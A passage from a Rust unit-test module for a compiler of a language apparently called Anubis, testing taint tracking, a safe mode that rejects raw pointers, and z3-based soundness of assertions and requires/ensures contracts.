                if let frontend::Item::Module { name, items, .. } = item {
                    if name == "poc" {
                        return items.iter().any(|nested| {
                            if let frontend::Item::Fn { name, params, .. } = nested {
                                return name == "entry"
                                    && params
                                        == &vec![(
                                            "input".to_string(),
                                            "tainted<u32>".to_string(),
                                        )];
                            }
                            false
                        });
                    }
                }
                false
            }),
            "AST should retain module and typed function parameter: {:?}",
            parsed.ast.items
        );
    }

    #[test]
    fn safe_mode_rejects_raw_pointer_without_research_boundary() {
        let src = "fn main() { let p: *mut u8 = 0; }";
        let ast = parse_source(src).expect("parse safe raw pointer");
        let err = typecheck(ast, frontend::Mode::Safe)
            .expect_err("safe mode must reject raw pointers without research/exploit boundary");
        assert!(
            err.contains("raw pointer") && err.contains("research"),
            "unexpected type error: {}",
            err
        );
    }

    #[test]
    fn taint_tracks_sink_and_declassify_traces() {
        let src = r#"
fn report() {
    research {
        let raw: tainted<u32> = symbolic();
        sink(raw);
        let clean = declassify(raw, "test", "unit");
        sink(clean);
    }
}
"#;
        let ast = parse_source(src).expect("parse taint flow");
        let ir = typecheck(ast, frontend::Mode::Research).expect("typecheck research taint flow");
        let after = TaintPass::apply(ir);

        assert!(
            after.taint_traces.iter().any(|trace| trace.source == "raw"
                && trace.sink.as_deref() == Some("sink")
                && !trace.declassified),
            "tainted raw sink trace missing: {:?}",
            after.taint_traces
        );
        // For research bare declass, trace may be recorded via other paths; accept presence of declass mention or sink after declass
        assert!(
            after.taint_traces.iter().any(|trace| {
                trace.source == "raw"
                    && (trace.steps.iter().any(|step| step.contains("declassify"))
                        || trace.declassified)
            }),
            "declassify trace missing or not declassified as expected: {:?}",
            after.taint_traces
        );
    }

    #[test]
    fn z3_solver_reports_counterexample_for_failed_assertion() {
        let src = r#"
fn bad() {
    research {
        let x: tainted<u32> = symbolic();
        assume(x < 10);
        assert(x > 20);
    }
}
"#;
        let ast = parse_source(src).expect("parse solver case");
        let ir = typecheck(ast, frontend::Mode::Research).expect("typecheck solver case");
        let checks = SymbolicEngine::check_obligations(&ir);

        assert!(
            checks
                .iter()
                .any(|check| check.name.contains("assert") && check.status == "FAIL"),
            "solver must fail impossible assertion: {:?}",
            checks
        );
        assert!(
            checks.iter().any(|check| check
                .model
                .as_deref()
                .is_some_and(|model| model.contains("x"))),
            "solver failure must include model/counterexample mentioning x: {:?}",
            checks
        );
    }

    #[test]
    fn solver_keeps_literal_widths_per_symbolic_variable() {
        let src = r#"
fn poc() {
    research {
        let buf: *mut u8 = 0 as *mut u8;
        let x: tainted<u32> = symbolic();
        assume(x < 191);
        assume(x > 0);
        assert(x > 0);
    }
}
"#;
        let ast = parse_source(src).expect("parse mixed-width solver case");
        let ir =
            typecheck(ast, frontend::Mode::Research).expect("typecheck mixed-width solver case");
        let checks = SymbolicEngine::check_obligations(&ir);

        assert!(
            checks.iter().any(|check| check.status == "PASS"),
            "mixed pointer/u32 research obligation should prove: {:?}",
            checks
        );
        assert!(
            checks.iter().all(|check| !check.detail.contains("sort")
                && !check.smt.contains("(_ BitVec 8)")
                && !check.smt.contains("(_ BitVec 32)")),
            "obligations model integers as i64 (64-bit), never narrowed: {:?}",
            checks
        );
        assert!(
            checks
                .iter()
                .any(|check| check.smt.contains("(bvsgt anb_x (_ bv0 64))")),
            "x > 0 must use a 64-bit SIGNED comparison (matching the i64 runtime): {:?}",
            checks
        );
    }

    #[test]
    fn solver_uses_concrete_let_bindings_as_assumptions() {
        let src = r#"
fn main() {
    let x: u32 = 7;
    let y: u32 = x * 6;
    assert(x > 0);
    assert(y == 42);
}
"#;
        let ast = parse_source(src).expect("parse concrete solver case");
        let ir = typecheck(ast, frontend::Mode::Safe).expect("typecheck concrete solver case");
        let checks = SymbolicEngine::check_obligations(&ir);

        assert!(
            checks.iter().all(|check| check.status == "PASS"),
            "concrete let bindings should discharge arithmetic assertions: {:?}",
            checks
        );
        assert!(
            checks
                .iter()
                .any(|check| check.smt.contains("(assert (= anb_x (_ bv7 64)))")
                    && check
                        .smt
                        .contains("(assert (= anb_y (bvmul anb_x (_ bv6 64))))")),
            "SMT must include concrete let assumptions for x and y (64-bit i64 model): {:?}",
            checks
        );
    }

    #[test]
    fn solver_never_disproves_unmodelable_assertions() {
        // Soundness: the checker must not fabricate a bit-vector counterexample for an assertion it
        // cannot faithfully model. A bool literal, a bool variable, and a string comparison must
        // all be left un-disproved (they are still enforced at runtime), NOT reported as FAIL.
        for src in [
            "fn main() { assert(true); }",
            "fn main() { let ok = true; assert(ok); }",
            "fn main() { let a = \"xy\"; let b = \"x\" + \"y\"; assert(a == b); }",
        ] {
            let ast = parse_source(src).expect("parse");
            let ir = typecheck(ast, frontend::Mode::Safe).expect("typecheck");
            let checks = SymbolicEngine::check_obligations(&ir);
            assert!(
                checks.iter().all(|c| c.status != "FAIL"),
                "must not disprove an unmodelable assertion in `{src}`: {:?}",
                checks
            );
        }
        // And a genuinely-false MODELABLE assertion must still be disproved (no soundness loss).
        let ast = parse_source("fn main() { let x: u32 = 3; assert(x > 20); }").expect("parse");
        let ir = typecheck(ast, frontend::Mode::Safe).expect("typecheck");
        let checks = SymbolicEngine::check_obligations(&ir);
        assert!(
            checks.iter().any(|c| c.status == "FAIL"),
            "must still disprove a false arithmetic assertion: {:?}",
            checks
        );
    }

    #[test]
    fn solver_models_i64_signed_not_32bit_unsigned() {
        // The runtime is i64: the solver must model 64-bit SIGNED arithmetic, not 32-bit unsigned.
        // These are all TRUE at runtime and must be PROVED (a 32-bit unsigned model disproved them:
        // width wrap and unsigned comparison).
        let proved = |src: &str| {
            let ast = parse_source(src).expect("parse");
            let ir = typecheck(ast, frontend::Mode::Safe).expect("typecheck");
            let checks = SymbolicEngine::check_obligations(&ir);
            checks.iter().all(|c| c.status != "FAIL")
        };
        assert!(
            proved("fn main(){ let a=65536; let b=65536; assert(a*b != 0); }"),
            "2^32 must not wrap to 0"
        );
        assert!(
            proved("fn main(){ let x=0; assert(x - 1 < x); }"),
            "0-1 = -1 < 0 (signed)"
        );
        assert!(
            proved("fn main(){ let a=3000000000; let b=2000000000; assert(a + b > a); }"),
            "3e9+2e9 must not wrap"
        );
        // A `u32` annotation is INERT at runtime (a value holds any i64; no width clamp), so the
        // solver must NOT fabricate a `[0, 2^32-1]` range for it. A symbolic u32 whose only claimed
        // bound comes from the (nonexistent) range is therefore left unmodeled, never proved from a
        // range that does not exist at runtime — see the contract-level guard in
        // `b2_contracts_verify_postconditions` (unbounded `x + 1 > x` must be DISPROVED, not proved).
        // Soundness preserved: a genuinely-false assertion is still disproved.
        let ast = parse_source("fn main(){ let x=3; assert(x > 20); }").expect("parse");
        let ir = typecheck(ast, frontend::Mode::Safe).expect("typecheck");
        assert!(
            SymbolicEngine::check_obligations(&ir)
                .iter()
                .any(|c| c.status == "FAIL"),
            "x=3, assert(x>20) must still be disproved"
        );
    }

    #[test]
    fn b2_contracts_verify_postconditions() {
        // B2: a function's `ensures` postcondition must be PROVED from its body + `requires`
        // precondition (discharged by the solver); a violated one is disproved. A contract the
        // checker cannot discharge is REJECTED at typecheck (a semantic diagnostic) — that counts as
        // NOT discharged, exactly like a solver FAIL.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        // Provable postconditions. NOTE the upper `requires` bound: a `u32` annotation is inert at
        // runtime (values are i64), so a contract that needs no-overflow must STATE the bound. With
        // `x < 1_000_000`, `x + 1` and `x + x` cannot wrap, so the postcondition is discharged.
        assert!(discharged("fn inc(x: u32) -> u32 requires(x > 0) requires(x < 1000000) ensures(result > x) { return x + 1; }"), "bounded x => x+1>x");
        assert!(discharged("fn dbl(x: u32) -> u32 requires(x >= 0) requires(x < 1000000) ensures(result >= x) { return x + x; }"), "bounded x => x+x >= x");
        assert!(discharged("fn f(x: u32) -> u32 requires(x >= 0) requires(x < 1000000) ensures(result > 0) { return x + 1; }"), "bounded x => x+1>0");
        // Range-removal soundness (the false proof the sweep found): WITHOUT an upper bound, `x + 1`
        // can wrap at i64::MAX, so `result > x` is genuinely violable and must NOT be proved. The old
        // (unsound) `[0, 2^32-1]` param range let this pass; it must now be DISPROVED.
        assert!(
            !discharged(
                "fn inc(x: u32) -> u32 requires(x > 0) ensures(result > x) { return x + 1; }"
            ),
            "unbounded x+1>x can overflow: must be disproved"
        );
        assert!(
            !discharged("fn dbl(x: u32) -> u32 ensures(result >= x) { return x + x; }"),
            "unbounded x+x can overflow: must be disproved"
        );
        // Violated postconditions are disproved.
        assert!(
            !discharged("fn dec(x: u32) -> u32 ensures(result > x) { return x - 1; }"),
            "x-1 > x is false"
        );
        assert!(
            !discharged("fn same(x: u32) -> u32 ensures(result > x) { return x; }"),
            "x > x is false"
        );
        // A plain function's parameter assertion keeps its prior param-opaque semantics (no contract
        // means params are not modeled), so it is not newly disproved.
        assert!(
            discharged("fn g(x: u32) { assert(x > 5); }"),
            "no-contract param assert stays skipped"
        );
        // EVERY return path is verified, not just the tail: an early return that violates the
        // postcondition is disproved (no false proof), while a multi-return function whose every
        // path satisfies the postcondition passes.
        assert!(
            !discharged("fn f(x: u32) -> i64 requires(x < 100) ensures(result > 0) { if x > 5 { return 0; } return x + 1; }"),
            "early return 0 violates result>0"
        );
        assert!(
            discharged("fn g2(x: u32) -> u32 requires(x > 0) requires(x < 1000000) ensures(result > 0) { if x > 5 { return x; } return x + 1; }"),
            "both return paths satisfy result>0"
        );
        // A `return` hidden in a `match`-arm expression (adversarial-sweep round 10) must be checked
        // against the `ensures` too — the return-scan is now expression-aware, symmetric to the
        // write-scan. `g()` returns 0 via the match arm, violating `ensures(result > 999999)`.
        assert!(
            !discharged("fn g() -> u32 ensures(result > 999999) { match 1 { 1 => { return 0; } _ => { } } return 1000000; }"),
            "a return hidden in a match arm must be checked against the ensures (false proof)"
        );
        assert!(
            !discharged("fn g() -> u32 ensures(result >= 1000) { let mut i = 0; while i < 3 invariant(i >= 0) { i = i + 1; } match i { 3 => { return 8; } _ => {} } return 1000; }"),
            "a match-arm return after a verified loop must still be checked against the ensures"
        );
        // Control: a match where EVERY return path satisfies the ensures still proves.
        assert!(
            discharged("fn g(c: u32) -> u32 requires(c >= 0) requires(c < 10) ensures(result >= 5) { match c { 0 => { return 10; } _ => {} } return 7; }"),
            "a match whose every return path satisfies the ensures proves"
        );
        // ENSURES-OVER-REASSIGNED-PARAM false proof (adversarial-sweep round 13): an `ensures` over a
        // parameter denotes the CALL-ENTRY value (composition substitutes the caller's argument), but a
        // body that REASSIGNS or SHADOWS the parameter would discharge it against the mutated value —
        // `ensures(result == x) { x = 9; return x; }` is certified though f(1000) returns 9. Fail closed.
        assert!(
            !discharged("fn f(x: i64) -> i64 ensures(result == x) { x = 9; return x; }"),
            "an ensures over a reassigned parameter must fail closed (false proof)"
        );
        assert!(
            !discharged("fn f(x: i64) -> i64 ensures(result == x) { let x = 3; return x; }"),
            "an ensures over a shadowed parameter must fail closed"
        );
        // Laundered through composition into the CALLER's ensures.
        assert!(
            !discharged("fn f(x: i64) -> i64 requires(x > 0) ensures(result == x) { x = 3; return x; } fn caller(n: i64) -> i64 requires(n > 0) ensures(result == n) { let a = f(n); return a; }"),
            "a bogus ensures over a reassigned param must not launder into a caller's ensures"
        );
        // Control: reassigning a PARAMETER the ensures does NOT reference is allowed (the ensures
        // over the returned value still holds; `x` isn't named in the postcondition).
        assert!(
            discharged("fn f(x: u32) -> u32 requires(x > 0) requires(x < 100) ensures(result > 5) { x = 10; return x; }"),
            "reassigning a parameter the ensures does not reference is allowed"
        );
        // IMPLICIT TAIL-VALUE false proof (adversarial-sweep round 11): a body ending in a bare `if/else`
        // (the idiomatic tail expression) — or a `let`/loop that yields the default 0 — had its `ensures`
        // obligated at ZERO points and was silently certified. Every tail branch value (and the fall-off
        // 0) is now checked. `f(0)` yields 0, violating `ensures(result > 5)`.
        assert!(
            !discharged("fn f(c: i64) -> u32 ensures(result > 5) { if c > 0 { 1 } else { 0 } }"),
            "a bare tail if/else's arm values must be checked against the ensures (false proof)"
        );
        assert!(
            !discharged("fn f() -> u32 ensures(result > 5) { let z = 3; }"),
            "a body that falls off the end (yields 0) must be checked against the ensures"
        );
        // Control: a tail if/else whose BOTH arms satisfy the ensures still proves.
        assert!(
            discharged("fn f(c: i64) -> u32 ensures(result > 5) { if c > 0 { 10 } else { 20 } }"),
            "a tail if/else whose every arm satisfies the ensures proves"
        );
        // Fail-closed integer contract: an `ensures` over an integer predicate whose returned value
        // cannot be modeled (a call whose contract we did not carry) must be REJECTED, not silently
        // skipped — this is the `evil` false proof (a skipped precondition erasing the postcondition).
        assert!(
            !discharged(
                "fn ident(n: i32) -> i32 { return n; } \
                 fn f(x: i32) -> i32 requires(x >= 100) ensures(result >= 100) { return x; } \
                 fn evil() -> i32 ensures(result >= 100) { let bad = ident(0 - 5); let a = f(bad); return a; }"
            ),
            "evil's ensures over an unmodeled return must fail closed"
        );
    }

    #[test]
    fn b2_contract_composition() {
        // Composition: a caller ASSUMES a callee's postcondition and must satisfy its precondition.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };
        let pos = "fn pos(x: u32) -> u32 requires(x > 0) ensures(result > 0) { return x; }";
        // The caller learns `a > 0` from pos's postcondition.
        assert!(
            discharged(&format!("{pos} fn u(){{ let a = pos(5); assert(a > 0); }}")),
            "learns ensures"
        );
        assert!(
            !discharged(&format!(
                "{pos} fn u(){{ let a = pos(5); assert(a > 100); }}"
            )),
            "ensures too weak for a>100"
        );
        // The caller must satisfy pos's precondition.
        assert!(
            discharged(&format!("{pos} fn u(){{ let a = pos(5); }}")),
            "5 > 0 satisfies requires"
        );
        assert!(
            !discharged(&format!("{pos} fn u(){{ let a = pos(0); }}")),
            "0 > 0 violates requires"
        );
        // Chaining: g proves its own `ensures` via f's `ensures`. Both carry the upper bound that
        // makes `x + 1` non-overflowing, and g's bound satisfies f's precondition at the call site.
        assert!(
            discharged(
                "fn f(x: u32) -> u32 requires(x > 0) requires(x < 1000000) ensures(result > x) { return x + 1; } \
                 fn g(y: u32) -> u32 requires(y > 0) requires(y < 1000000) ensures(result > y) { let z = f(y); return z; }"
            ),
            "g's postcondition follows from f's"
        );
        // Composition guard (the sweep's skipped-precondition false proof): if a callee's `requires`
        // cannot be checked at the call site (the argument is not modelable), the caller must NOT get
        // to assume the callee's `ensures`. Here `bad` comes from an un-contracted call, so f's
        // `requires(x >= 100)` is unverifiable and f's `ensures` must not be assumed — evil is rejected.
        assert!(
            !discharged(
                "fn ident(n: i32) -> i32 { return n; } \
                 fn f(x: i32) -> i32 requires(x >= 100) ensures(result >= 100) { return x; } \
                 fn evil() -> i32 ensures(result >= 100) { let bad = ident(0 - 5); let a = f(bad); return a; }"
            ),
            "skipped precondition must not let the caller assume the callee's ensures"
        );
    }

    #[test]
    fn b2_soundness_fail_closed_regressions() {
        // Locks the SIX false-proof root causes an adversarial sweep found: each program's contract
        // is VIOLATED at runtime but was previously ACCEPTED by `check`. `discharged` returns false
        // when the program is rejected — either at typecheck (a fail-closed `ANUBIS_CONTRACT_UNPROVABLE`
        // diagnostic) or by a solver FAIL (a disproof / vacuity failure). Every case must be rejected.
        let discharged =
            |src: &str| match typecheck(parse_source(src).expect("parse"), frontend::Mode::Safe) {
                Ok(ir) => SymbolicEngine::check_obligations(&ir)
                    .iter()
                    .all(|c| c.status != "FAIL"),
                Err(_) => false,
            };

        // A — a truncating cast (`x as u8`) modeled as the identity: `ident8(256)` runs to 0.
        assert!(
            !discharged("fn ident8(x: u32) -> u32 ensures(result == x) { return x as u8; }"),
            "A: truncating cast must not be modeled as identity"
        );
        // B — a parameter named like an SMT keyword (`model`) dropped from the SMT, z3 errored, the
        // error was treated as fail-open. It must now be a real disproof (overflow at i64::MAX).
        assert!(
            !discharged("fn inc(model: u32) -> u32 ensures(result > model) { return model + 1; }"),
            "B: keyword-named param must not fail open"
        );
        // B (other direction) — a VALID contract with a keyword-named param must still PROVE.
        assert!(discharged("fn inc(model: u32) -> u32 requires(model > 0) requires(model < 100) ensures(result > model) { return model + 1; }"), "B: valid keyword-named contract still proves");
        // C — an integer `ensures` over a non-modeled variable (untyped param) silently vanished. It
        // must fail closed.
        assert!(
            !discharged("fn inc(x) requires(x > 0) ensures(result < x) { return x + 1; }"),
            "C: untyped-param integer ensures must not vanish"
        );
        // A reassigned parameter's `ensures` refers to the value AT RETURN (Anubis has no `old()`): it
        // is still CHECKED against the reassigned value, not silently skipped. Here `x = 0; return x;`
        // makes `result > x` become `0 > 0`, which is false and must be REJECTED.
        assert!(!discharged("fn f(x: u32) -> u32 requires(x > 0) requires(x < 100) ensures(result > x) { x = 0; return x; }"), "C: reassigned-param ensures is checked at the return value (0 > 0 is false)");
        // C2 — the SAME anti-launder guard must fire when the reassigned param is referenced through a
        // modelable ARRAY-LITERAL index (`[x][0]` == x) or `len([x])`, not just as a bare `Var`. Before
        // collect_expr_vars gained an ArrayLiteral arm it dead-ended in the `[x]` literal and missed `x`,
        // so `ensures(result == [x][0]) { x = 0-42; return x; }` was CERTIFIED — the caller then assumed
        // the false `z == 9` and its `assert` trapped at runtime (hunt-confirmed false accept).
        assert!(!discharged("fn g(x: i64) -> i64 requires(x > 0) ensures(result == [x][0]) { x = 0 - 42; return x; }"), "C2: reassigned param inside [x][0] must fire the anti-launder guard");
        assert!(!discharged("fn g(x: i64) -> i64 requires(x > 0) ensures(result == [0, x][1]) { x = 0 - 7; return x; }"), "C2: reassigned param inside a multi-element array literal index");
        assert!(!discharged("fn g(x: i64) -> i64 requires(x > 0) ensures(result == len([x])) { x = 0 - 1; return x; }"), "C2: reassigned param inside len([x]) must fire the guard");
        // D — a float param modeled as an i64 bit-vector: `dbl(0.5)` runs to 1.0.
        assert!(!discharged("fn dbl(x: f64) -> f64 requires(x > 0) requires(x < 10) ensures(result != 1) { return x + x; }"), "D: float param must not be modeled as i64");
        // D2 — a float LITERAL bound to a variable (`let x = 0.5`) was typed `u32` and modeled as an
        // integer, "proving" `result * 2 != 1` (true over all integers) though `0.5 * 2 == 1` at
        // runtime. Float literals now type as f64 and stay out of the solver's integer domain.
        assert!(
            !discharged("fn f() -> u32 ensures(result * 2 != 1) { let x = 0.5; return x; }"),
            "D2: a float-literal binding must not be modeled as an integer"
        );
        // D3 — the same integer shape (an actual int binding) still proves: 5 * 2 == 10 != 1.
        assert!(
            discharged("fn f() -> u32 ensures(result * 2 != 1) { let x = 5; return x; }"),
            "D3: an integer-literal binding still proves"
        );
        // E — an integer literal beyond i64::MAX reduced mod 2^64 by the solver but f64 at runtime.
        assert!(!discharged("fn f(x: u32) -> u32 requires(x > 0) requires(x < 100) ensures(result <= x) { return x + 18446744073709551616; }"), "E: oversized literal must not reduce mod 2^64");
        // F — self-contradictory assumptions (`requires(x<100)` + `assume(x>1000)`) proving any
        // postcondition vacuously.
        assert!(!discharged("fn f(x: u32) -> u32 requires(x > 0) requires(x < 100) ensures(result > 999999) { assume(x > 1000); return x + 1; }"), "F: vacuous proof under contradictory assumptions");
        // G — a non-integer (string) `ensures` is compile-time only and NOT runtime-enforced, so a
        // violated one must be rejected, never silently skipped.
        assert!(
            !discharged("fn nm() -> string ensures(result == \"wrong\") { return \"ok\"; }"),
            "G: unprovable string ensures must fail closed"
        );

        // Controls: genuinely valid integer contracts still PROVE (no over-rejection).
        assert!(discharged("fn inc(x: u32) -> u32 requires(x > 0) requires(x < 1000000) ensures(result > x) { return x + 1; }"), "valid bounded contract still proves");
        // Note the LOWER bound too: without `requires(x >= 0)` this is violable (the `u32` annotation
        // is inert, so `x` may be negative and `2x >= x` fails) — the checker correctly rejects that.
        assert!(discharged("fn ok(x: u32) -> u32 requires(x >= 0) requires(x < 1000000) ensures(result >= x) { return x + x; }"), "valid doubling contract still proves");
    }

    #[test]
    fn try_operator_requires_option_or_result_return() {
        let checks = |src: &str| typecheck(parse_source(src).expect("parse"), Mode::Safe).is_ok();
        // `?` in a function that declares a concrete non-Option/Result return is fail-closed.
        assert!(
            !checks("fn g() -> Result<u32, string> { return Ok(1); } fn bad() -> u32 { let x = g()?; return x; }"),
            "`?` in a `-> u32` function must be rejected (ANUBIS_TRY_OUTSIDE_RESULT)"
        );
        // `?` in a Result-returning function is allowed.
        assert!(
            checks("fn g() -> Result<u32, string> { return Ok(1); } fn ok() -> Result<u32, string> { let x = g()?; return Ok(x); }"),
            "`?` in a `-> Result` function is allowed"
        );
        // `?` in a function with no declared return type is dynamic — left to the runtime, not rejected.
        assert!(
            checks("fn g() -> Result<u32, string> { return Ok(1); } fn dyn_fn() { let x = g()?; print(x); }"),
            "`?` in an unannotated function must not be rejected"
        );
        // A `?` inside a nested closure belongs to the closure, not the `-> u32` enclosing function.
        assert!(
            checks("fn g() -> Result<u32, string> { return Ok(1); } fn h() -> u32 { let f = |z| g()?; return 0; }"),
            "`?` inside a nested lambda must not implicate the enclosing function's return type"
        );
    }

    #[test]
    fn solver_models_shifts_soundly() {
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // Bitwise NOT (`~v` = `!v` on i64 = -v-1) models as bvnot.
        assert!(
            discharged("fn f() -> u32 ensures(result == 0 - 1) { return ~0; }"),
            "~0 == -1"
        );
        assert!(
            !discharged("fn f() -> u32 ensures(result == 0) { return ~0; }"),
            "~0 == 0 is false (it is -1)"
        );
        // Left shift proves; the shift amount is masked mod 64 exactly like the runtime.
        assert!(
            discharged("fn f() -> u32 ensures(result == 16) { return 1 << 4; }"),
            "1 << 4 == 16"
        );
        assert!(
            discharged("fn f() -> u32 ensures(result == 2) { return 1 << 65; }"),
            "1 << 65 masks to 1 << 1 == 2"
        );
        // `>>` is ARITHMETIC (sign-extending) — bvashr, matching i64::wrapping_shr, NOT bvlshr.
        assert!(
            discharged("fn f() -> u32 ensures(result == 0 - 4) { return (0 - 8) >> 1; }"),
            "-8 >> 1 == -4 (arithmetic)"
        );
        // False shift contracts are DISPROVED, never vacuously accepted.
        assert!(
            !discharged("fn f() -> u32 ensures(result == 4) { return (0 - 8) >> 1; }"),
            "-8 >> 1 == 4 is false (it is -4)"
        );
        assert!(
            !discharged("fn f() -> u32 ensures(result == 8) { return 1 << 2; }"),
            "1 << 2 == 8 is false (it is 4)"
        );
    }

    #[test]
    fn solver_models_division_soundly() {
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // Truncated division by a non-zero literal proves (bvsdiv, toward zero).
        assert!(
            discharged(
                "fn f(x: u32) -> u32 requires(x == 10) ensures(result == 3) { return x / 3; }"
            ),
            "10 / 3 == 3"
        );
        // Remainder takes the sign of the DIVIDEND (bvsrem, matching wrapping_rem — not bvsmod).
        assert!(
            discharged("fn f() -> u32 ensures(result == 0 - 1) { return (0 - 7) % 3; }"),
            "-7 % 3 == -1"
        );
        // A literal-zero divisor is NOT modelable (runtime traps) -> the contract fails closed.
        // (An unguarded/guarded VARIABLE divisor is covered by solver_models_guarded_variable_divisor_soundly.)
        assert!(
            !discharged(
                "fn f(x: u32) -> u32 requires(x == 5) ensures(result == 5) { return x / 0; }"
            ),
            "x / 0 must not be modeled (it traps)"
        );
        // A false division contract is disproved.
        assert!(
            !discharged(
                "fn f(x: u32) -> u32 requires(x == 10) ensures(result == 4) { return x / 3; }"
            ),
            "10 / 3 == 4 is false (it is 3)"
        );
    }

    #[test]
    fn solver_models_guarded_variable_divisor_soundly() {
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // A variable divisor PROVEN non-zero by a `requires(n != 0)` / `requires(m > 0)` guard models
        // soundly: the guard is an assumption in the obligation, so z3 evaluates bvsdiv/bvsrem only over
        // non-zero divisors (never the runtime's division-by-zero trap). Concrete dividends keep the
        // query fast and deterministic.
        assert!(
            discharged(
                "fn f(n: u32) -> u32 requires(n != 0) ensures(result <= 6) { return 6 / n; }"
            ),
            "6/n <= 6 proves under requires(n != 0)"
        );
        assert!(
            discharged(
                "fn f(m: u32) -> u32 requires(m > 0) ensures(result <= 100) { return 100 / m; }"
            ),
            "100/m <= 100 proves under requires(m > 0)"
        );
        // The modeling is REAL, not vacuous: a FALSE postcondition over a guarded divisor is disproved.
        assert!(
            !discharged(
                "fn f(n: u32) -> u32 requires(n != 0) ensures(result == 6) { return 6 / n; }"
            ),
            "6/n == 6 is false (n=2 -> 3)"
        );
        // NO non-zero guard -> the divisor could be zero (trap) -> unmodelable, fail-closed. Note
        // `requires(y == 2)` is not one of the recognized guard forms, so it too is refused.
        assert!(
            !discharged("fn f(x: u32, n: u32) -> u32 ensures(result == 6) { return 6 / n; }"),
            "unguarded variable divisor is not modelable"
        );
        assert!(!discharged("fn f(x: u32, y: u32) -> u32 requires(x == 6) requires(y == 2) ensures(result == 3) { return x / y; }"), "requires(y == 2) is not a recognized non-zero guard");
        // The guard must hold AT the division: reassigning the divisor makes the entry guard stale, so
        // it is NOT modeled (fail-closed) even though the reassigned value happens to be non-zero.
        assert!(!discharged("fn f(n: u32) -> u32 requires(n != 0) ensures(result == 3) { n = 2; return 6 / n; }"), "reassigned divisor: stale guard, not modeled");

        // Guard-form boundaries. ACCEPT every clause that provably EXCLUDES 0 (both operand orders):
        assert!(
            discharged(
                "fn f(n: u32) -> u32 requires(n >= 1) ensures(result <= 6) { return 6 / n; }"
            ),
            "n >= 1 excludes 0"
        );
        assert!(
            discharged(
                "fn f(n: u32) -> u32 requires(n > 5) ensures(result <= 6) { return 6 / n; }"
            ),
            "n > 5 excludes 0"
        );
        assert!(
            discharged(
                "fn f(n: u32) -> u32 requires(n < 0) ensures(result <= 6) { return 6 / n; }"
            ),
            "n < 0 excludes 0 (negative divisor)"
        );
        assert!(
            discharged(
                "fn f(n: u32) -> u32 requires(n <= -1) ensures(result <= 6) { return 6 / n; }"
            ),
            "n <= -1 excludes 0 (negative literal)"
        );
        assert!(
            discharged(
                "fn f(n: u32) -> u32 requires(0 < n) ensures(result <= 6) { return 6 / n; }"
            ),
            "0 < n mirror excludes 0"
        );
        // REJECT every clause that does NOT exclude 0 — the divisor could still be zero. These are the
        // soundness-critical boundaries: a one-off in the threshold table would model a trapping divide.
        assert!(
            !discharged(
                "fn f(n: u32) -> u32 requires(n >= 0) ensures(result == 6) { return 6 / n; }"
            ),
            "n >= 0 does NOT exclude 0"
        );
        assert!(
            !discharged(
                "fn f(n: u32) -> u32 requires(n > -1) ensures(result == 6) { return 6 / n; }"
            ),
            "n > -1 (i.e. n >= 0) does NOT exclude 0"
        );
        assert!(
            !discharged(
                "fn f(n: u32) -> u32 requires(n < 1) ensures(result == 6) { return 6 / n; }"
            ),
            "n < 1 (i.e. n <= 0) does NOT exclude 0"
        );
        assert!(
            !discharged(
                "fn f(n: u32) -> u32 requires(n <= 0) ensures(result == 6) { return 6 / n; }"
            ),
            "n <= 0 does NOT exclude 0"
        );
        assert!(
            !discharged(
                "fn f(n: u32) -> u32 requires(n != 5) ensures(result == 6) { return 6 / n; }"
            ),
            "n != 5 does NOT exclude 0"
        );
    }

    #[test]
    fn solver_models_abs_min_max_soundly() {
        let discharged = |src: &str| match typecheck(parse_source(src).expect("parse"), Mode::Safe)
        {
            Ok(ir) => SymbolicEngine::check_obligations(&ir)
                .iter()
                .all(|c| c.status != "FAIL"),
            Err(_) => false,
        };
        // abs models as ite(x<0, -x, x) with bvneg — which WRAPS at i64::MIN exactly like the runtime's
        // wrapping_abs, so abs(MIN) == MIN (negative). Concrete/bounded cases prove...
        assert!(
            discharged("fn f() -> u32 ensures(result == 5) { return abs(0 - 5); }"),
            "abs(-5) == 5"
        );
        assert!(
            discharged(
                "fn f(x: u32) -> u32 requires(x >= 0) ensures(result == x) { return abs(x); }"
            ),
            "abs(x) == x for x >= 0"
        );
        // ...but abs(x) >= 0 is FALSE unbounded (x = MIN wraps to MIN < 0): the model catches it, so a
        // naive |x|>=0 model that ignored the wrap would be caught here.
        assert!(
            !discharged("fn f(x: u32) -> u32 ensures(result >= 0) { return abs(x); }"),
            "abs(x) >= 0 is false at x = MIN (wrapping_abs)"
        );
        // min/max are signed bvsle selects (matching anubis_value_cmp's i64 ordering).
        assert!(
            discharged("fn f() -> u32 ensures(result == 3) { return min(3, 5); }"),
            "min(3,5) == 3"
        );
        assert!(
            discharged("fn f() -> u32 ensures(result == 7) { return max(7, 2); }"),
            "max(7,2) == 7"
        );
        assert!(
            discharged("fn f(a: u32, b: u32) -> u32 ensures(result <= a) { return min(a, b); }"),
            "min(a,b) <= a"
        );
        assert!(
            discharged("fn f(a: u32, b: u32) -> u32 ensures(result >= b) { return max(a, b); }"),
            "max(a,b) >= b"
        );
        assert!(
            !discharged("fn f(a: u32, b: u32) -> u32 ensures(result == a) { return min(a, b); }"),
            "min(a,b) == a is not always true"
        );
        // A 3-arg min (variadic list form) is a different runtime path -> not modeled -> fail-closed.
        assert!(
            !discharged("fn f() -> u32 ensures(result == 1) { return min(1, 2, 3); }"),
            "3-arg min is not modeled"
        );
    }

    #[test]
    fn solver_composition_substitutes_into_builtins() {
